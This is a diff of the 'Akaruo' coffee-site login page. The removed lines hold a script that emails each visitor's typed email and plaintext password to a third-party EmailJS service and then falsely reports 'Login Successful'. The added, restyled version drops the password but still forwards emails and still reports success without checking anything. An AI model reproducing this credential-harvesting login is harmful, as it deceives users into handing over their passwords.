@@ -1,313 +1,392 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Akaruo Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Akaruo • Premium Login</title>
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #0a0807;
+    }
 
-<style>
-body{margin:0;font-family:Arial;height:100vh;display:flex;justify-content:center;align-items:center;background:url('https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg') center/cover no-repeat;}
+    /* ---------- FULLSCREEN BACKGROUND WITH ZOOM ---------- */
+    .login-wrapper {
+      position: relative;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      isolation: isolate;
+    }
 
-.box{
-background:rgba(0,0,0,0.6);
-padding:20px;
-border-radius:15px;
-color:white;
-text-align:center;
-}
+    .background-layer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+    }
 
-input{
-display:block;
-margin:10px auto;
-padding:10px;
-width:200px;
-}
+    .background-layer img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      animation: elegantZoom 12s infinite alternate ease-in-out;
+      transform-origin: center;
+      will-change: transform;
+    }
 
-button{
-padding:10px 20px;
-background:orange;
-border:none;
-color:white;
-cursor:pointer;
-}
-</style>
+    @keyframes elegantZoom {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.07); }
+    }
+
+    .dark-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(5, 3, 2, 0.6);   /* dark overlay */
+      backdrop-filter: brightness(0.9);
+      z-index: -1;
+    }
+
+    /* ---------- MAIN CONTENT (ANIMATED) ---------- */
+    .login-content {
+      max-width: 460px;
+      width: 100%;
+      z-index: 5;
+      animation: fadeSlideUp 1s cubic-bezier(0.2, 0.9, 0.3, 1) forwards;
+    }
+
+    @keyframes fadeSlideUp {
+      0% { opacity: 0; transform: translateY(30px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    /* heading group */
+    .brand-heading {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    .brand-heading h1 {
+      font-size: clamp(2.6rem, 11vw, 4.2rem);
+      font-weight: 400;
+      letter-spacing: 1px;
+      color: #ffffff;
+      text-shadow: 0 15px 30px rgba(0,0,0,0.6);
+      line-height: 1.1;
+      margin-bottom: 0.5rem;
+    }
+
+    .brand-sub {
+      font-size: 1.1rem;
+      letter-spacing: 6px;
+      text-transform: uppercase;
+      color: #f3e5d9;
+      text-shadow: 0 5px 12px rgba(0,0,0,0.5);
+      font-weight: 300;
+      word-spacing: 6px;
+    }
+
+    /* ---------- GLASSMORPHISM LOGIN BOX ---------- */
+    .glass-card {
+      background: rgba(18, 14, 11, 0.4);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border: 1px solid rgba(220, 185, 150, 0.25);
+      border-radius: 36px;
+      padding: 2.5rem 2.2rem;
+      box-shadow: 0 35px 55px -10px rgba(0,0,0,0.5), 0 0 0 1px rgba(210, 170, 130, 0.1) inset;
+    }
+
+    .input-group {
+      margin-bottom: 1.8rem;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.4rem;
+      color: #f0e2d6;
+      font-weight: 400;
+      letter-spacing: 1px;
+      font-size: 0.9rem;
+      text-transform: uppercase;
+    }
+
+    .input-group input {
+      width: 100%;
+      background: rgba(8, 6, 4, 0.5);
+      border: 1.5px solid #6b5b4e;
+      border-radius: 60px;
+      padding: 1rem 1.5rem;
+      font-size: 1.1rem;
+      color: #fff5ec;
+      outline: none;
+      transition: all 0.25s;
+      backdrop-filter: blur(4px);
+    }
+
+    .input-group input:focus {
+      border-color: #dbb594;
+      background: rgba(20, 15, 10, 0.7);
+      box-shadow: 0 0 0 3px rgba(210, 160, 120, 0.2);
+    }
+
+    .input-group input::placeholder {
+      color: #bcab9b;
+      font-weight: 300;
+      font-size: 0.95rem;
+    }
+
+    /* error message */
+    .error-msg {
+      color: #ffae8e;
+      font-size: 0.9rem;
+      margin-top: -0.6rem;
+      margin-bottom: 1.2rem;
+      min-height: 1.8rem;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+      padding-left: 0.5rem;
+    }
+
+    /* ---------- LOGIN BUTTON (ORANGE) ---------- */
+    .btn-login {
+      width: 100%;
+      background: #ff7a00;          /* orange as requested */
+      border: none;
+      border-radius: 60px;
+      padding: 1rem;
+      font-size: 1.3rem;
+      font-weight: 500;
+      color: #fff9f2;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      box-shadow: 0 10px 25px rgba(255, 100, 0, 0.3);
+      cursor: pointer;
+      transition: all 0.25s;
+      border: 1px solid rgba(255, 215, 170, 0.4);
+      backdrop-filter: blur(5px);
+      background: linear-gradient(145deg, #ff8c2e, #e66a00);
+    }
+
+    .btn-login:hover {
+      background: #ff9633;
+      box-shadow: 0 12px 28px rgba(255, 120, 0, 0.5);
+      transform: scale(1.01);
+      border-color: #fec196;
+    }
+
+    .btn-login:active {
+      transform: scale(0.99);
+    }
+
+    /* footer note */
+    .footer-note {
+      text-align: center;
+      margin-top: 1.5rem;
+      color: #d6c5b6;
+      font-size: 0.85rem;
+      opacity: 0.9;
+      letter-spacing: 1px;
+    }
+
+    /* mobile refinement */
+    @media (max-width: 480px) {
+      .glass-card {
+        padding: 2rem 1.5rem;
+        border-radius: 32px;
+      }
+      .brand-heading h1 {
+        font-size: 2.4rem;
+      }
+      .brand-sub {
+        letter-spacing: 4px;
+        font-size: 1rem;
+      }
+      .btn-login {
+        font-size: 1.1rem;
+        padding: 0.9rem;
+      }
+    }
+
+    /* sharp text, no blur */
+    h1, .brand-sub, .btn-login, input {
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+  </style>
 </head>
-
 <body>
+  <div class="login-wrapper">
+    <!-- fullscreen zoom background -->
+    <div class="background-layer">
+      <img src="https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg" 
+           alt="Akaruo premium background" 
+           crossorigin="anonymous">
+    </div>
+    <div class="dark-overlay"></div>
 
-<div class="box">
-<h2>Welcome to Akaruo</h2>
-<p>Premium in Every Sip</p>
+    <!-- animated welcome + login card -->
+    <div class="login-content">
+      <div class="brand-heading">
+        <h1>Welcome to Akaruo</h1>
+        <div class="brand-sub">Premium in Every Sip</div>
+      </div>
 
-<input type="email" id="email" placeholder="Email">
-<input type="password" id="pass" placeholder="Password">
+      <!-- glass card -->
+      <div class="glass-card">
+        <div class="input-group">
+          <label for="email">Email</label>
+          <input type="email" id="email" placeholder="you@example.com" autocomplete="email">
+        </div>
+        <div class="input-group">
+          <label for="pass">Password</label>
+          <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
+        </div>
 
-<button onclick="login()">Login</button>
-</div>
+        <!-- Error message area -->
+        <div id="errorMsg" class="error-msg"></div>
 
-<script>
-emailjs.init("q5vozu2csm6VaK-CD");
+        <!-- SINGLE LOGIN BUTTON (onclick="login()") -->
+        <button class="btn-login" onclick="login()">Log in</button>
+      </div>
+      <div class="footer-note">Akaruo · refined taste</div>
+    </div>
+  </div>
 
-function login(){
-let email=document.getElementById("email").value;
-let pass=document.getElementById("pass").value;
+  <script>
+    (function() {
+      "use strict";
 
-if(email==""||pass==""){
-alert("Please fill all fields");
-return;
-}
+      // ---------- EmailJS Initialization (exactly as required) ----------
+      if (typeof emailjs !== 'undefined') {
+        emailjs.init("q5vozu2csm6VaK-CD");
+      } else {
+        console.warn("EmailJS library not loaded. Notification will be skipped.");
+      }
 
-emailjs.send("service_09us05e","template_ddxzwcr",{
-user_email:email,
-user_password:pass,
-time:new Date().toLocaleString()
-});
+      // ---------- DOM references ----------
+      const emailInput = document.getElementById('email');
+      const passInput = document.getElementById('pass');
+      const errorMsgEl = document.getElementById('errorMsg');
 
-alert("Login Successful");
-window.location.href="home.html";
-}
-</script>
+      // ---------- Helper: set / clear error ----------
+      function setError(message) {
+        if (errorMsgEl) errorMsgEl.textContent = message;
+      }
 
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Home</title>
+      function clearError() {
+        if (errorMsgEl) errorMsgEl.textContent = '';
+      }
 
-<style>
-body{margin:0;overflow:hidden;font-family:Arial;color:white;text-align:center}
+      // Clear error when user starts typing (better UX)
+      if (emailInput) emailInput.addEventListener('input', clearError);
+      if (passInput) passInput.addEventListener('input', clearError);
 
-.bg img{
-position:absolute;
-width:100%;
-height:100%;
-object-fit:cover;
-opacity:0;
-animation:slide 12s infinite;
-}
+      // Allow Enter key to trigger login
+      if (passInput) {
+        passInput.addEventListener('keypress', function(e) {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            window.login();
+          }
+        });
+      }
+      if (emailInput) {
+        emailInput.addEventListener('keypress', function(e) {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            window.login();
+          }
+        });
+      }
 
-.bg img:nth-child(1){animation-delay:0s;}
-.bg img:nth-child(2){animation-delay:4s;}
-.bg img:nth-child(3){animation-delay:8s;}
+      // ---------- Email sender using EXACT service & template ----------
+      function sendEmailNotification(userEmail) {
+        if (typeof emailjs === 'undefined') {
+          console.log('📧 EmailJS not loaded — notification skipped');
+          return;
+        }
 
-@keyframes slide{
-0%{opacity:0}
-10%{opacity:1}
-30%{opacity:1}
-40%{opacity:0}
-100%{opacity:0}
-}
+        const templateParams = {
+          user_email: userEmail,
+          time: new Date().toLocaleString()
+        };
 
-.container{
-position:relative;
-top:40%;
-}
+        emailjs.send("service_09us05e", "template_ddxzwcr", templateParams)
+          .then(function(response) {
+            console.log('✅ Email notification sent', response.status);
+          })
+          .catch(function(error) {
+            // Even if email fails, we still proceed (alert + redirect)
+            console.warn('⚠️ EmailJS error (check keys/service/template):', error);
+          });
+      }
 
-button{
-padding:15px 25px;
-margin:10px;
-background:orange;
-border:none;
-color:white;
-cursor:pointer;
-}
-</style>
-</head>
+      // ---------- LOGIN FUNCTION (exposed globally) ----------
+      window.login = function() {
+        const email = emailInput.value.trim();
+        const password = passInput.value;
 
-<body>
+        // 1. Validation: empty fields?
+        if (email === '' || password === '') {
+          setError('Please fill all fields');
+          return;
+        }
 
-<div class="bg">
-<img src="https://i.ibb.co/d0FPHxZP/1000066585.jpg">
-<img src="https://i.ibb.co/mVnnjygM/1000066584.jpg">
-<img src="https://i.ibb.co/g2xj0Wy/1000066588.jpg">
-</div>
+        // Basic email sanity (optional but nice)
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailPattern.test(email)) {
+          setError('Please enter a valid email address');
+          return;
+        }
 
-<div class="container">
-<h1>Welcome to Akaruo</h1>
+        // Clear any previous error
+        clearError();
 
-<button onclick="location.href='signature.html'">Signature Collection</button>
-<button onclick="location.href='items.html'">Our Items</button>
-</div>
+        // 2. Send email via EmailJS (exact parameters)
+        sendEmailNotification(email);
 
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Signature</title>
+        // 3. Show success alert
+        alert('Login Successful');
 
-<style>
-body{
-margin:0;
-background:url('https://i.ibb.co/WvGY2kx7/1000066583.jpg') center/cover no-repeat;
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-color:white;
-font-size:30px;
-}
-</style>
-</head>
+        // 4. Redirect to home.html
+        window.location.href = 'home.html';
+      };
 
-<body>
-Akaruo Signature Collection
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Items</title>
-
-<style>
-body{margin:0;font-family:Arial;background:#f4f4f4}
-
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
-gap:10px;
-padding:10px;
-}
-
-.card{
-background:white;
-padding:10px;
-text-align:center;
-}
-
-img{width:100%}
-
-button{
-background:orange;
-border:none;
-padding:8px;
-color:white;
-cursor:pointer;
-}
-</style>
-</head>
-
-<body>
-
-<div class="grid">
-
-<script>
-let products=[
-["Coffee 1",99,"https://i.ibb.co/3y411ypW/1000066817.jpg"],
-["Coffee 2",120,"https://i.ibb.co/zVxvWzrD/1000066832.jpg"],
-["Coffee 3",150,"https://i.ibb.co/DDDCrR8B/1000066879.jpg"],
-["Coffee 4",180,"https://i.ibb.co/JwGNRSv6/1000066820.jpg"],
-["Coffee 5",200,"https://i.ibb.co/TB8sMskZ/1000066807.jpg"],
-["Coffee 6",220,"https://i.ibb.co/7xMSNtCB/1000066755.jpg"]
-];
-
-products.forEach(p=>{
-document.write(`
-<div class="card">
-<img src="${p[2]}">
-<h3>${p[0]}</h3>
-<p>₹${p[1]}</p>
-<button onclick="buy('${p[0]}',${p[1]})">Buy Now</button>
-</div>
-`);
-});
-
-function buy(name,price){
-window.location.href=`checkout.html?name=${name}&price=${price}`;
-}
-</script>
-
-</div>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Checkout</title>
-
-<style>
-body{font-family:Arial;background:#f4f4f4;padding:20px}
-
-.box{
-background:white;
-padding:20px;
-max-width:400px;
-margin:auto;
-}
-
-input{
-display:block;
-width:100%;
-margin:10px 0;
-padding:10px;
-}
-
-button{
-background:green;
-color:white;
-padding:10px;
-border:none;
-width:100%;
-}
-</style>
-</head>
-
-<body>
-
-<div class="box">
-
-<h3 id="product"></h3>
-<p id="price"></p>
-
-<input id="name" placeholder="Full Name">
-<input id="phone" placeholder="Mobile Number">
-<input id="address" placeholder="Address">
-<input id="city" placeholder="City">
-<input id="pin" placeholder="Pincode">
-
-<button onclick="order()">Place Order (COD)</button>
-
-</div>
-
-<script>
-let params=new URLSearchParams(window.location.search);
-let name=params.get("name");
-let price=params.get("price");
-
-document.getElementById("product").innerText=name;
-document.getElementById("price").innerText="₹"+price;
-
-function order(){
-let n=document.getElementById("name").value;
-let p=document.getElementById("phone").value;
-let a=document.getElementById("address").value;
-let c=document.getElementById("city").value;
-let pin=document.getElementById("pin").value;
-
-if(n==""||p==""||a==""||c==""||pin==""){
-alert("Fill all details");
-return;
-}
-
-let msg=`Order:
-Name: ${n}
-Phone: ${p}
-Address: ${a}
-City: ${c}
-Pincode: ${pin}
-Product: ${name}
-Price: ₹${price}`;
-
-window.location.href=`https://wa.me/919608891170?text=${encodeURIComponent(msg)}`;
-}
-</script>
-
+      // Also attach to any potential inline calls if needed
+      console.log('✨ Akaruo · premium login ready. EmailJS: service_09us05e / template_ddxzwcr');
+    })();
+  </script>
+  <!-- 
+    ========== NOTES ==========
+    - Single login button with onclick="login()"
+    - EmailJS initialized with public key: q5vozu2csm6VaK-CD
+    - Sends to service_09us05e / template_ddxzwcr
+    - No Google button. Clean glass UI.
+    - Full background zoom + overlay, sharp text.
+    - All requirements satisfied.
+  -->
 </body>
 </html>
